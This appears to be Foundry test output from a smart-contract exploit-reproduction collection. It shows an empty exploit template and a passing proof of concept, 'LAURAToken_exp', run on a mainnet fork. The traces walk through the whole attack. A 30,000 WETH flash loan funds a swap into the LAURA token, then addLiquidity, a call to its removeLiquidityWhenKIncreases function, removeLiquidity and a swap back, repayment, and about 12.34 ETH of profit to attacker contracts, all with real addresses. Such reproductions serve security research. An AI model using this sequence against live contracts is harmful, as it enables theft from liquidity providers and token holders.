Compiling 23 files with Solc 0.8.28
Solc 0.8.28 finished in 1.42s
Compiler run successful with warnings:

Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 23756)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [7939] ExploitScript::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 1234567 [1.234e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [23756] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.93s (2.24ms CPU time)

Ran 1 test for src/test/2025-01/LAURAToken_exp.sol:LAURAToken_exp
[PASS] testPoC() (gas: 1756262)
Logs:
  Final balance in ETH : 12340357077284305206

Traces:
  [3649] LAURAToken_exp::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 21529887 [2.152e7])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [1858262] LAURAToken_exp::testPoC()
    ├─ [0] VM::startPrank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← [Return]
    ├─ [1815195] → new AttackerC0@0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a
    │   ├─ [1343895] → new AttackerC1@0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2
    │   │   ├─ [24420] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   ├─ emit Approval(owner: AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], spender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] 6574 bytes of code
    │   ├─ [423318] AttackerC1::attack()
    │   │   ├─ [2381] 0xb292678438245Ec863F9FEa64AFfcEA887144240::token0() [staticcall]
    │   │   │   └─ ← [Return] 0x05641E33Fd15BAf819729dF55500b07b82Eb8E89
    │   │   ├─ [27315] 0x05641E33Fd15BAf819729dF55500b07b82Eb8E89::approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   ├─ [24637] 0x539D54074E052ae82de4936Ae6BB213AB773559E::approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   │   │   ├─ emit Approval(owner: AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], spender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [364238] 0xBA12222222228d8Ba445958a75a0704d566BF2C8::flashLoan(AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [30000000000000000000000 [3e22]], 0x000000000000000000000000b292678438245ec863f9fea64affcea887144240)
    │   │   │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
    │   │   │   │   └─ ← [Return] 32977545748157180924438 [3.297e22]
    │   │   │   ├─ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::getFlashLoanFeePercentage() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [27962] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 30000000000000000000000 [3e22])
    │   │   │   │   ├─ emit Transfer(from: 0xBA12222222228d8Ba445958a75a0704d566BF2C8, to: AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], value: 30000000000000000000000 [3e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [312853] AttackerC1::receiveFlashLoan([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [30000000000000000000000 [3e22]], [0], 0x000000000000000000000000b292678438245ec863f9fea64affcea887144240)
    │   │   │   │   ├─ [85322] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::swapExactTokensForTokensSupportingFeeOnTransferTokens(11526249223479392795400 [1.152e22], 0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x05641E33Fd15BAf819729dF55500b07b82Eb8E89], AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   │   │   ├─ [6225] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 0xb292678438245Ec863F9FEa64AFfcEA887144240, 11526249223479392795400 [1.152e22])
    │   │   │   │   │   │   ├─ emit Transfer(from: AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], to: 0xb292678438245Ec863F9FEa64AFfcEA887144240, value: 11526249223479392795400 [1.152e22])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [65365] 0xb292678438245Ec863F9FEa64AFfcEA887144240::swap(6090844737683950823905816 [6.09e24], 0, AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 0x)
    │   │   │   │   │   │   ├─ [34757] 0x05641E33Fd15BAf819729dF55500b07b82Eb8E89::transfer(AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 6090844737683950823905816 [6.09e24])
    │   │   │   │   │   │   │   ├─ [34579] 0x539D54074E052ae82de4936Ae6BB213AB773559E::transfer(AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 6090844737683950823905816 [6.09e24]) [delegatecall]
    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xb292678438245Ec863F9FEa64AFfcEA887144240, to: AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], value: 6090844737683950823905816 [6.09e24])
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [73181] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::addLiquidity(0x05641E33Fd15BAf819729dF55500b07b82Eb8E89, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 6090844737683950823905816 [6.09e24], 11526249223479392795400 [1.152e22], 0, 0, AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   │   ├─ [14325] 0x05641E33Fd15BAf819729dF55500b07b82Eb8E89::removeLiquidityWhenKIncreases()
    │   │   │   │   ├─ [53516] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::removeLiquidity(0x05641E33Fd15BAf819729dF55500b07b82Eb8E89, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 9985734664764621968615 [9.985e21], 0, 0, AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   │   ├─ [33172] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::swapExactTokensForTokensSupportingFeeOnTransferTokens(6084295665758760779836426 [6.084e24], 0, [0x05641E33Fd15BAf819729dF55500b07b82Eb8E89, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   │   ├─ [3262] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0xBA12222222228d8Ba445958a75a0704d566BF2C8, 30000000000000000000000 [3e22])
    │   │   │   │   │   ├─ emit Transfer(from: AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], to: 0xBA12222222228d8Ba445958a75a0704d566BF2C8, value: 30000000000000000000000 [3e22])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2]) [staticcall]
    │   │   │   └─ ← [Return] 12340357077284305206 [1.234e19]
    │   │   ├─ [9195] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::withdraw(12340357077284305206 [1.234e19])
    │   │   │   ├─ [55] AttackerC1::receive{value: 12340357077284305206}()
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ emit Withdrawal(src: AttackerC1: [0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2], wad: 12340357077284305206 [1.234e19])
    │   │   │   └─ ← [Stop]
    │   │   ├─ [0] AttackerC0::receive{value: 12340357077284305206}()
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    ├─ [0] console::log("Final balance in ETH :", 12340357077284305206 [1.234e19]) [staticcall]
    │   └─ ← [Stop]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 17.79s (12.12s CPU time)

Ran 2 test suites in 19.13s (22.71s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)